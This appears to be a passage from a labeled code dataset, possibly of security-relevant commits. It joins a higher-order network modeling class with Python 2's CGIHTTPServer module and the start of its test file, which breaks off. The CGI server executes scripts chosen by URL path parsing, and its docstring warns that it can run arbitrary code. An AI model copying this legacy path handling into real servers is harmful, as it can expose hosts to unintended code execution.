            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for v in self.nodes:
            for w in self.nodes:
                if v != w:
                    for k in self.nodes:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/n",1
4,4,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
